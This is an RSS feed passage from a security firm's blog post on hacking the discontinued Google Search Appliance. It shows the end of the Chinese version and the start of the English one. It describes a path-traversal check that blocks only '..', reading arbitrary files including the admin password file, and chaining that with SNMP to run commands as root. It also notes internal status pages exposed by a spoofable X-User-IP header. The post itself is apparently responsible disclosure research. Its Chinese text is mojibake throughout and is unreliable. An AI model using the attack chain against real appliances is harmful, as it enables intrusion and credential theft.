                &lt;span class=&quot;no&quot;&gt;IO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isValid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Strings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isEmpty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;..&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂèØ‰ª•ÁôºÁèæÊ≠§ËôïÂè™ÊúâÊ™¢Êü•Â≠ó‰∏≤ÊòØÂê¶Âê´Êúâ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;..&lt;/code&gt; Ôºå‰ΩÜÊàëÂÄëÂèØ‰ª•Áõ¥Êé•ÊåáÂÆöÁµïÂ∞çË∑ØÂæë„ÄÇ
‰∏¶Áõ¥Êé•ËÆÄÂèñÊú¨Ê©ü‰ªªÊÑèÊ™îÊ°àÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ËàäÁâàGSA Ê≤íÊúâ /font ÈÄôÂÄãÁ´ØÈªûÔºå‰ΩÜ /dps/admin ÊúâÈ°û‰ººÁöÑËÆÄÊ™îÂïèÈ°åÔºåÂèØ‰ª•Áõ¥Êé•ÊåáÂÆö logName ÈÄ≤Ë°åÊ™îÊ°àËÆÄÂèñÔºå
ÂèØÂèÉËÄÉ‰∏ãÂúñÁõ¥Êé•ËÆÄÂèñÁ≥ªÁµ±ÁÆ°ÁêÜ‰ªãÈù¢Â∏≥ËôüÂØÜÁ¢ºÊ™îÔºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊàêÂäüÁ†¥Ëß£ÈõúÊπäÂæåÔºåÁôªÂÖ•ÂæåÂèØ‰ª•ÈñãÂïü SNMP ÊúçÂãôÈÖçÂêàÁ¨¨‰∏ÄÂÄãÊºèÊ¥û‰∏¶‰ª• root Ê¨äÈôêÂü∑Ë°å‰ªªÊÑèÊåá‰ª§„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÂÖ∂‰ªñÁôºÁèæË∑üÊï¥ÁêÜ&quot;&gt;ÂÖ∂‰ªñÁôºÁèæË∑üÊï¥ÁêÜ&lt;/h3&gt;

&lt;h4 id=&quot;ÊúçÂãôÊú¨Ë∫´ÂÖßÈÉ®Á∂≤ÂùÄ&quot;&gt;ÊúçÂãôÊú¨Ë∫´ÂÖßÈÉ®Á∂≤ÂùÄ&lt;/h4&gt;
&lt;p&gt;GSA ‰∏≠ÊúâË®±Â§öÁöÑÂ≠êÊúçÂãôÈñì‰ΩøÁî® HTTP ÂÇ≥Ëº∏ÂçîÂÆöÊ∫ùÈÄöÔºåËÄåÂú®Ë®±Â§öÊúçÂãôÈÉΩÊúâÊèê‰æõ /varz„ÄÅ/helpz„ÄÅ/procz Á≠âÁ∂≤ÂùÄÔºå
ÂèØ‰ª•Âú®ÊúçÂãôÂÆöÁæ©ÁöÑ‰ø°‰ªªÁ∂≤Ë∑Ø‰ΩçÁΩÆÊàñ 127.0.0.1 ‰∏≠Â≠òÂèñÔºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ËÄåÂú® vGSA ‰∏≠ËßÄÂØüÂà∞ÊúçÂãôÂü∑Ë°åÂèÉÊï∏Êúâ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;useripheader=X-User-Ip&lt;/code&gt; ÔºåÂ∞éËá¥Â∞çÂ§ñÈñãÊîæÁöÑÁÆ°ÁêÜ‰ªãÈù¢ÂèØ‰ª•Â∏∂ÂÖ• X-User-IP Ë´ãÊ±ÇÈ†≠ÂæåÁõ¥Êé•Â≠òÂèñÊ≠§ÂäüËÉΩÔºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;/procz Á´ØÈªûÁîöËá≥ÂèØ‰ª•ÊäìÂèñÂü∑Ë°åÊ™îÂèä‰ΩøÁî®Âà∞ÁöÑÂÖ±‰∫´ÂáΩÁ§∫Â∫´Ôºö
&lt;img src=&quot;/assets/img/blog/20230707/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ÂûãËôüÊï¥ÁêÜ&quot;&gt;ÂûãËôüÊï¥ÁêÜ&lt;/h4&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;ÂûãËôü&lt;/th&gt;
      &lt;th&gt;Ë£ΩÈÄ†ÂïÜÂèäÂûãËôü&lt;/th&gt;
      &lt;th&gt;Á°¨È´îË¶èÊ†º&lt;/th&gt;
      &lt;th&gt;ÁâàËôü&lt;/th&gt;
      &lt;th&gt;Êñá‰ª∂Êï∏Èáè&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Google Mini&lt;/td&gt;
      &lt;td&gt;Gigabyte&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&quot;&gt;Pentium III 1G / 2GB memory / 120G&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;3.4.14&lt;/td&gt;
      &lt;td&gt;300,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google Mini-002X&lt;/td&gt;
      &lt;td&gt;SuperMicro&lt;/td&gt;
      &lt;td&gt;Pentium 4 3G / 2GB memory / 250G HDD&lt;/td&gt;
      &lt;td&gt;5.0.0&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-1001&lt;/td&gt;
      &lt;td&gt;Dell Poweredge 2950&lt;/td&gt;
      &lt;td&gt;Xeon / 16GB memory / 1.25TB HDD&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
      &lt;td&gt;3,000,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-1002&lt;/td&gt;
      &lt;td&gt;Gigabyte&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-7007&lt;/td&gt;
      &lt;td&gt;Dell R710&lt;/td&gt;
      &lt;td&gt;Xeon E5520 / 48GB memory / 3TB HDD&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
      &lt;td&gt;10,000,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-9009&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
      &lt;td&gt;Xeon X5560 / 96GB memory / 3.6TB HDD&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
      &lt;td&gt;30,000,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google G100&lt;/td&gt;
      &lt;td&gt;Dell R720XD&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google G500&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&quot;Ê†∏ÂøÉÁâàÊú¨&quot;&gt;Ê†∏ÂøÉÁâàÊú¨&lt;/h4&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;GSA ÁâàÊú¨&lt;/th&gt;
      &lt;th&gt;Ê†∏ÂøÉÁâàÊú¨&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;7.6.0&lt;/td&gt;
      &lt;td&gt;Linux version 3.14.44_gsa-x64_1.5 (mrevutskyi@mrevutskyi.mtv.corp.google.com) (gcc version 4.9.x-google 20150123 (prerelease) (Google_crosstoolv18-gcc-4.9.x-x86_64-grtev4-linux-gnu) ) #1 SMP Mon Nov 23 09:19:11 PST 2015&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7.4.0&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7.2.0&lt;/td&gt;
      &lt;td&gt;Linux version 3.4.3_gsa-x64_1.5 (martincochran@ypc-ubiq202.dls.corp.google.com) (gcc version 4.6.x-google 20120601 (prerelease) (Google_crosstoolv15-gcc-4.6.x-glibc-2.11.1-grte) ) #1 SMP Tue Jul 9 15:36:01 PDT 2013&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7.0.14&lt;/td&gt;
      &lt;td&gt;Linux version 3.4.3_gsa-x64_1.3 (stephenamar@neutrino.mtv.corp.google.com) (gcc version 4.6.x-google 20120601 (prerelease) (Google_crosstoolv15-gcc-4.6.x-glibc-2.11.1-grte) ) #1 SMP Thu Jul 19 11:59:57 PDT 2012&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5.2.0&lt;/td&gt;
      &lt;td&gt;Linux version 2.6.20_vmw-smp_3.1 (yifeng@yifeng.corp.google.com) (gcc version 4.1.1) #1 SMP Thu Jan 24 22:34:28 PST 2008&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;ÊôÇÈñìËª∏&quot;&gt;ÊôÇÈñìËª∏&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;ÊôÇÈñì&lt;/th&gt;
      &lt;th&gt;‰∫ã‰ª∂&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;2005/06/10&lt;/td&gt;
      &lt;td&gt;Java Code Injection &lt;a href=&quot;https://seclists.org/fulldisclosure/2005/Nov/652&quot;&gt;CVE-2005-3757&lt;/a&gt; Ë¢´ H D Moore ÂõûÂ†±&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2008 ‰∏äÂçäÂπ¥&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 5.0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2008/10/28&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ vgsa_20081028.7z (5.2.0)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2013/04/20&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 6.14.0.G28&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/03/20&lt;/td&gt;
      &lt;td&gt;XSS ÊºèÊ¥û &lt;a href=&quot;https://latesthackingnews.com/2014/05/03/xss-vulnerability-found-in-google-search-appliance/&quot;&gt;CVE-2014-0362&lt;/a&gt; Ë¢´ Will Dormann ÂõûÂ†±&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/10/01&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 7.0.14.G238&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/10/03&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 7.2.0.G252&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/12/12&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 7.2.0.G264&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/02/07&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 7.2.0.G270&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/04/15&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 7.4.0.G64&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/04/22&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 7.4.0.G72&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/04/30&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 7.4.0.G74&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/06/04&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 7.4.0.G82&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016 ‰∏äÂçäÂπ¥&lt;/td&gt;
      &lt;td&gt;Google ÂÆ£Â∏É GSA Â∞áÊúÉÈÄêÊ≠•ÈÄÄÂá∫Â∏ÇÂ†¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/01/05&lt;/td&gt;
      &lt;td&gt;XML Â§ñÈÉ®ÂØ¶È´îÊîªÊìä &lt;a href=&quot;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&quot;&gt;&lt;/a&gt; Ë¢´ Timo ÂõûÂ†±&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/05/24&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 7.6.0.G36&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/07/01&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 7.6.0.G42&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/07/31&lt;/td&gt;
      &lt;td&gt;Êú¨Êñá‰ΩúËÄÖÂèñÂæóÊ≠§Ë®≠ÂÇôÔºåÁâàÊú¨ÁÇ∫ 7.0.14&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/08/25&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 7.6.0.G46&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/10/21&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 7.6.0.G58&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/01/19&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 7.6.50.G30&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/04/19&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 7.6.50.G36&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/07/28&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 7.6.50.G64&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/11/09&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 7.6.250.G12&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/12/28&lt;/td&gt;
      &lt;td&gt;ÊúÄÂæåËÉΩË®ÇË≥º GSA ÁöÑÊó•Êúü&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/01/17&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 7.6.250.G20&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/03/21&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 7.6.250.G26&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/06/15&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 7.6.360.G10&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/10/08&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 7.6.360.G16&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2019/04/26&lt;/td&gt;
      &lt;td&gt;ÈáãÂá∫ GSA 7.6.512.G18ÔºåÊáâË©≤ÁÇ∫ÊúÄÂæå‰∏ÄÂÄãÁâàÊú¨&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/16&lt;/td&gt;
      &lt;td&gt;ÂõûÂ†±ÊºèÊ¥û&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/16&lt;/td&gt;
      &lt;td&gt;Êî∂Âà∞Ê©üÂô®‰∫∫ÂõûÊáâÁ¢∫Ë™çÊî∂Âà∞ÂõûÂ†±‰ø°‰ª∂&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/16&lt;/td&gt;
      &lt;td&gt;ÂïèÈ°åÊñº issuetracker.google.com Ë¢´ÊåáÊ¥æ&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/18&lt;/td&gt;
      &lt;td&gt;Google ÊèêÁ§∫ÊºèÊ¥û‰∏çÁ¨¶ÂêàÁçéÈáëÊ¢ù‰ª∂Ôºå‰ΩÜÊúÉÊñº‰∏ãÊ¨°ÊúÉË≠∞ÂÜçÊ¨°Ë®éË´ñ&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/20&lt;/td&gt;
      &lt;td&gt;Á¢∫Ë™çÊºèÊ¥û‰∏çÁôºÊîæÁçéÈáë&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/11/01&lt;/td&gt;
      &lt;td&gt;Ë©¢ÂïèÊºèÊ¥ûÊòØÂê¶ÊúÉÊåáÊ¥æ CVE ÊºèÊ¥ûÁ∑®Ëôü&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/11/02&lt;/td&gt;
      &lt;td&gt;Á¢∫Ë™ç‰∏çÊúÉÊúâ CVE ÊºèÊ¥ûÁ∑®Ëôü&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2023 ‰∏äÂçäÂπ¥&lt;/td&gt;
      &lt;td&gt;ÈñãÂßãÁ∑®ÂØ´ÊñáÁ´†&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2023/06/04&lt;/td&gt;
      &lt;td&gt;ÂàùÁ®øÂÆåÊàê&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;ÁµêË´ñ&quot;&gt;ÁµêË´ñ&lt;/h3&gt;

&lt;p&gt;ÈõñÁÑ∂ GSA/vGSA Â∑≤Á∂ìÊòØÁµêÊùüÁîüÂëΩÂë®ÊúüÁöÑÁî¢ÂìÅÔºå‰ΩÜÁ†îÁ©∂ Google Â¶Ç‰ΩïÂ∞çË®≠ÂÇôÂéªÂ¢ûÂä†Áî¢ÂìÅÁöÑÂÆâÂÖ®ÊÄßÂèäÊ∏õÂ∞ëÊîªÊìäÂêëÈáè
ÂèØ‰ª•Â¢ûÂä†Âπ≥Â∏∏ËºÉÂ∞ëÊé•Ëß∏ÁöÑÁü•Ë≠òÈù¢„ÄÇÈõñÁÑ∂Êñá‰∏≠Ê≤íÊúâË©≥Á¥∞Ë™™ÊòéÔºåÂåÖÂê´Â¶Ç‰ΩøÁî® Java ÁöÑ Security ManagerÔºå
Linux Kernel ÁöÑ seccomp ÈÉΩÊòØ GSA ‰∏≠Êúâ‰ΩøÁî®ÁöÑÊäÄË°ìÔºåËÄåÊú¨Ê¨°Á†îÁ©∂‰∏≠‰πüÁïô‰∏ã‰∏Ä‰∫õÂèØ‰æõÂæåÁ∫åÁ†îÁ©∂ÁöÑÁõÆÊ®ôÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;feedergate ÊúçÂãô&lt;/li&gt;
  &lt;li&gt;Oracle ÁöÑ Outside-in Technology ËΩâÊèõÊñá‰ª∂Ê†ºÂºèÁöÑË®òÊÜ∂È´îÊºèÊ¥û&lt;/li&gt;
  &lt;li&gt;convert_to_html seccomp sandbox&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÊúâÁ†îÁ©∂ÊàêÊûúÊôÇÂÜçË∑üÂ§ßÂÆ∂ÂàÜ‰∫´Ôºå‰∏ãÊ¨°Ë¶ã„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÂÖ∂‰ªñÂèÉËÄÉÁ∂≤ÂùÄ&quot;&gt;ÂÖ∂‰ªñÂèÉËÄÉÁ∂≤ÂùÄ&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&quot;&gt;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/&quot;&gt;https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/1333&quot;&gt;https://www.exploit-db.com/exploits/1333&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&quot;&gt;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.anandtech.com/show/2407&quot;&gt;https://www.anandtech.com/show/2407&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&quot;&gt;https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/google/subpar&quot;&gt;https://github.com/google/subpar&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&quot;&gt;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/57760#issuecomment-356466614&quot;&gt;https://github.com/kubernetes/kubernetes/issues/57760#issuecomment-356466614&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2014-0362&quot;&gt;https://nvd.nist.gov/vuln/detail/CVE-2014-0362&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=un01LMLMuis&quot;&gt;https://www.youtube.com/watch?v=un01LMLMuis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=K-sEER8CK0U&quot;&gt;https://www.youtube.com/watch?v=K-sEER8CK0U&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://technical-fundas.blogspot.com/2016/05/google-search-appliance-migrate.html?&quot;&gt;http://technical-fundas.blogspot.com/2016/05/google-search-appliance-migrate.html?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2023/07/07/a-journey-into-hacking-google-search-appliance/</link>
                <guid>https://devco.re/blog/2023/07/07/a-journey-into-hacking-google-search-appliance</guid>
                <pubDate>Fri, 07 Jul 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>[REL] A Journey Into Hacking Google Search Appliance</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2023/07/07/a-journey-into-hacking-google-search-appliance-en&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2023/07/07/a-journey-into-hacking-google-search-appliance/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;tldr&quot;&gt;TL;DR&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;GSA Admin console post-authentication Remote Code Execution.&lt;/li&gt;
  &lt;li&gt;GSA Search interface Path traversal.&lt;/li&gt;
  &lt;li&gt;GSA uses Oracle‚Äôs Outside-in Technology to convert documents.&lt;/li&gt;
  &lt;li&gt;Google Web services have some fixed URIs that provide information about the service itself.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;

&lt;p&gt;The Google Search Appliance (hereinafter referred to as GSA) is an enterprise search device launched by Google in 2002, used for indexing and retrieving internal or public network information. Around 2005, Google introduced the Google Mini for personal and small business use. Later, at the end of 2008, a virtual machine version was launched, called the Virtual Google Search Appliance (hereinafter referred to as VGSA). However, at the end of 2018, Google ended the life cycle of the GSA product and integrated it into the Cloud Search product line.&lt;/p&gt;

&lt;h3 id=&quot;appliance-and-software-acquisition&quot;&gt;Appliance and Software Acquisition&lt;/h3&gt;

&lt;p&gt;We managed to purchase a device by searching ‚ÄúGoogle Search Appliance‚Äù on eBay.&lt;/p&gt;

&lt;p&gt;Luckily, the first one we bought was a GSA with unerased data:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Even now, you can still find devices that are currently being sold.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On the other hand, The original public link of vGSA has been removed.
http://dl.google.com/vgsa/vgsa_20090210.7z [removed]
http://dl.google.com/vgsa/vgsa_20081028.7z [removed]&lt;/p&gt;

&lt;p&gt;We found the file on BitTorrent magnet link:&lt;/p&gt;

